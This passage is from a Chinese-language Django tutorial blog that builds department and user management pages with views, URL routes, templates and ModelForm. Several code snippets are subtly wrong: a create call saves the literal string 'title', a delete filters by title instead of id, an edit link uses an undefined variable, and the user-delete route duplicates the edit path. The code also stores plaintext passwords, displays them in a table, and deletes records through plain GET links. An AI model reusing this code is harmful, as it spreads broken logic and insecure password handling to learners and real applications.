%&#125;</span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span>&gt;</span>部门标题<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;title&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-default&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>app01&#x2F;views.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render, HttpResponse, redirect</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">depart_add</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;depart_add.html&quot;</span>)</span><br><span class="line">    <span class="comment"># POST</span></span><br><span class="line">    title = request.POST.get(<span class="string">&quot;title&quot;</span>)</span><br><span class="line">    models.Department.objects.create(title=<span class="string">&quot;title&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/depart/list/&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>页面效果:<br><img data-src="/2024/0915151753/image2.png"></p>
<h3><span id="删除部门">删除部门</span></h3><p>webproj&#x2F;urls.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;depart/delete/&#x27;</span>, views.depart_delete),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>app01&#x2F;views.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">depart_delete</span>(<span class="params">request</span>):</span><br><span class="line">    nid = request.GET.get(<span class="string">&quot;nid&quot;</span>)</span><br><span class="line">    models.Department.objects.<span class="built_in">filter</span>(title=nid).delete()</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/depart/list/&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>app01&#x2F;templates&#x2F;depart_list.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">    &#123;% for d in departs %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; d.id &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; d.title &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span>&gt;</span>Edit<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-danger&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/depart/delete/?nid=&#123;&#123; d.id &#125;&#125;&quot;</span>&gt;</span>Delete<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="修改部门">修改部门</span></h3><p>效果: 点击Edit后，把部门的title带到输入框里。<br>webproj&#x2F;urls.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">	<span class="comment"># http://127.0.0.1:80000/depart/1/edit/</span></span><br><span class="line">    path(<span class="string">&#x27;depart/&lt;int:nid&gt;/edit/&#x27;</span>, views.depart_edit),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>app01&#x2F;views.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">depart_edit</span>(<span class="params">request, nid</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        depart = models.Department.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=nid).first()</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;depart_edit.html&quot;</span>, &#123;<span class="string">&quot;depart&quot;</span>: depart&#125;)</span><br><span class="line">    <span class="comment"># POST</span></span><br><span class="line">    title = request.POST.get(<span class="string">&#x27;title&#x27;</span>)</span><br><span class="line">    models.Department.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=nid).update(title=title)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/depart/list/&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>depart_list.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% for d in departs %&#125;</span><br><span class="line"> <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; d.id &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; d.title &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/depart/&#123;&#123; obj.id &#125;&#125;/edit/&quot;</span>&gt;</span>Edit<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<p>depart_edit.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel panel-default&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel-heading&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">&quot;panel-title&quot;</span>&gt;</span>编辑部门<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel-body&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 水平排列的表单 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">          &#123;% csrf_token %&#125;</span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span>&gt;</span>部门标题<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;&#123; depart.title &#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-default&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>页面效果<br><img data-src="/2024/0915151753/image3.png"></p>
<h3><span id="显示用户列表">显示用户列表</span></h3><p>多个HTML页面都用到了相同的导航栏，可以把相同的组件抽成模板(layout.html)</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% block content %&#125;-&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
<p>在新页面引用layout.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends &#x27;layout.html&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="显示用户列表">显示用户列表</span></h3><p>urls.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">	path(<span class="string">&#x27;user/list/&#x27;</span>, views.user_list),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>MySQL里加几条用户数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">desc</span> app01_userinfo;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+---------------+------+-----+---------+----------------+</span></span><br><span class="line"><span class="operator">|</span> Field       <span class="operator">|</span> Type          <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+---------------+------+-----+---------+----------------+</span></span><br><span class="line"><span class="operator">|</span> id          <span class="operator">|</span> <span class="type">bigint</span>        <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span> PRI <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> auto_increment <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> name        <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">16</span>)   <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> password    <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">64</span>)   <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> age         <span class="operator">|</span> <span class="type">int</span>           <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> account     <span class="operator">|</span> <span class="type">decimal</span>(<span class="number">10</span>,<span class="number">2</span>) <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> create_time <span class="operator">|</span> datetime(<span class="number">6</span>)   <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> gender      <span class="operator">|</span> <span class="type">smallint</span>      <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> depart_id   <span class="operator">|</span> <span class="type">bigint</span>        <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span> MUL <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+---------------+------+-----+---------+----------------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">insert</span> <span class="keyword">into</span> app01_userinfo <span class="keyword">values</span>(<span class="number">1</span>, <span class="string">&#x27;peter&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="number">18</span>, <span class="number">100</span>, <span class="string">&#x27;2024-09-21 11:31:00&#x27;</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">insert</span> <span class="keyword">into</span> app01_userinfo(name,password,age,account,create_time,gender,depart_id) </span><br><span class="line"><span class="keyword">values</span>(<span class="string">&#x27;peter&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="number">18</span>, <span class="number">100</span>, <span class="string">&#x27;2024-09-21 11:31:00&#x27;</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>views.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">user_list</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        users = models.UserInfo.objects.<span class="built_in">all</span>()</span><br><span class="line">		<span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">			<span class="built_in">print</span>(user.<span class="built_in">id</span>, user.name, user.account, user.create_time.strftime(<span class="string">&quot;%Y-%m-%d&quot;</span>), user.gender)</span><br><span class="line">			<span class="built_in">print</span>(user.get_gender_display)</span><br><span class="line">			<span class="built_in">print</span>(user.depart) <span class="comment"># 自动关联查询</span></span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;user_list.html&quot;</span>, &#123;<span class="string">&quot;users&quot;</span>: users&#125;)</span><br></pre></td></tr></table></figure>

<p>templates&#x2F;user_list.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% load static %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">&quot;table table-bordered&quot;</span>&gt;</span></span><br><span class="line">	            <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>ID<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>Age<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>Account<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>Createtime<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>Gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>Depart<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>Operation<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">                &#123;% for u in users %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; u.id &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; u.name &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; u.password &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; u.age &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; u.account&#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; u.create_time | date:&quot;Y-m-d H:i:s&quot; &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; u.get_gender_display &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; u.depart.title &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span>&gt;</span>Edit<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-danger&quot;</span>&gt;</span>Delete<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>模板中解析datetime <code>&lt;td&gt;&#123;&#123; u.create_time | date:"Y-m-d H:i:s" &#125;&#125;&lt;/td&gt;</code></li>
<li>模板中解析性别: <code>&lt;td&gt;&#123;&#123; u.get_gender_display &#125;&#125;&lt;/td&gt;</code></li>
<li>关联查询部门: <code>&lt;td&gt;&#123;&#123; u.depart.title &#125;&#125;&lt;/td&gt;</code></li>
</ul>
<h3><span id="添加用户">添加用户</span></h3><p>原始方式存在的问题:</p>
<ul>
<li>用户数据未做校验</li>
<li>如果输入错误，也没有错误提示</li>
<li>页面上，每一个字段都有重新写一遍</li>
<li>关联数据，需要手动获取传参，再展示到页面</li>
</ul>
<p>为了解决以上问题，Django提供了ModelForm组件<br>urls.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">	path(<span class="string">&#x27;user/add/&#x27;</span>, views.user_add),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>views.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> forms</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserModelForm</span>(forms.ModelForm):</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">        model = models.UserInfo</span><br><span class="line">        fields = [<span class="string">&quot;name&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="string">&quot;age&quot;</span>, <span class="string">&quot;account&quot;</span>, <span class="string">&quot;create_time&quot;</span>, <span class="string">&quot;gender&quot;</span>, <span class="string">&quot;depart&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(*args, **kwargs)</span><br><span class="line">        <span class="keyword">for</span> name, field <span class="keyword">in</span> <span class="variable language_">self</span>.fields.items():</span><br><span class="line">            field.widget.attrs = &#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;form-control&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_add</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        form = UserModelForm()</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;user_add.html&quot;</span>, &#123;<span class="string">&quot;form&quot;</span>: form&#125;)</span><br><span class="line">    <span class="comment"># POST:</span></span><br><span class="line">    form = UserModelForm(data=request.POST)</span><br><span class="line">    <span class="keyword">if</span> form.is_valid():</span><br><span class="line">        form.save()</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/user/list/&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(form.errors)</span><br></pre></td></tr></table></figure>
<p>user_add.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel-body&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 水平排列的表单 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        &#123;% csrf_token %&#125;</span><br><span class="line">        &#123;% for field in form %&#125;</span><br><span class="line">            &#123;&#123; field &#125;&#125;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="编辑用户">编辑用户</span></h3><p>urls.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;user/&lt;int:nid&gt;/edit/&#x27;</span>, views.user_edit),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>views.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">user_edit</span>(<span class="params">request, nid</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        obj = models.UserInfo.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=nid).first()</span><br><span class="line">        form = UserModelForm(instance=obj)</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;user_edit.html&quot;</span>, &#123;<span class="string">&quot;form&quot;</span>: form&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># POST</span></span><br><span class="line">    user = models.UserInfo.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=nid).first()</span><br><span class="line">    form = UserModelForm(data=request.POST, instance=user)</span><br><span class="line">    <span class="keyword">if</span> form.is_valid():</span><br><span class="line">        form.save()</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/user/list/&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(form.errors)</span><br></pre></td></tr></table></figure>

<h3><span id="删除用户">删除用户</span></h3><p>urls.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;user/&lt;int:nid&gt;/edit/&#x27;</span>, views.user_delete),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>views.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">user_delete</span>(<span class="params">request, nid</span>):</span><br><span class="line">    obj = models.UserInfo.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=nid).delete()</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/user/list/&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3><span id="靓号管理">靓号管理</span></h3><p>表结构</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">desc</span> app01_prettynum;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------------+------+-----+---------+----------------+</span></span><br><span class="line"><span class="operator">|</span> Field  <span class="operator">|</span> Type        <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------------+------+-----+---------+----------------+</span></span><br><span class="line"><span class="operator">|</span> id     <span class="operator">|</span> <span class="type">bigint</span>      <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span> PRI <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> auto_increment <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mobile <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">11</span>) <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> price  <span class="operator">|</span> <span class="type">int</span>         <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> level  <span class="operator">|</span> <span class="type">smallint</span>    <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> status <span class="operator">|</span> <span class="type">smallint</span>    <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------------+------+-----+---------+----------------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<h4><span id="展示靓号">展示靓号</span></h4><p>models.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">PrettyNum</span>(models.Model):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 靓号表 &quot;&quot;&quot;</span></span><br><span class="line">    mobile = models.CharField(verbose_name=<span class="string">&quot;手机号&quot;</span>, max_length=<span class="number">11</span>)</span><br><span class="line">    price = models.IntegerField(verbose_name=<span class="string">&quot;价格&quot;</span>, default=<span class="number">0</span>)</span><br><span class="line">    level_choices = (</span><br><span class="line">        (<span class="number">1</span>, <span class="string">&quot;1级&quot;</span>),</span><br><span class="line">        (<span class="number">2</span>, <span class="string">&quot;2级&quot;</span>),</span><br><span class="line">        (<span class="number">3</span>, <span class="string">&quot;3级&quot;</span>),</span><br><span class="line">        (<span class="number">4</span>, <span class="string">&quot;4级&quot;</span>),</span><br><span class="line">    )</span><br><span class="line">    level = models.SmallIntegerField(verbose_name=<span class="string">&quot;级别&quot;</span>, choices=level_choices, default=<span class="number">1</span>)</span><br><span class="line">    status_choices = (</span><br><span class="line">        (<span class="number">1</span>, <span class="string">&quot;已占用&quot;</span>),</span><br><span class="line">        (<span class="number">2</span>, <span class="string">&quot;未占用&quot;</span>),</span><br><span class="line">    )</span><br><span class="line">    status = models.SmallIntegerField(verbose_name=<span class="string">&quot;状态&quot;</span>, choices=status_choices, default=<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>urls.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;pretty/list/&#x27;</span>, views.pretty_list),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>views.py</p>
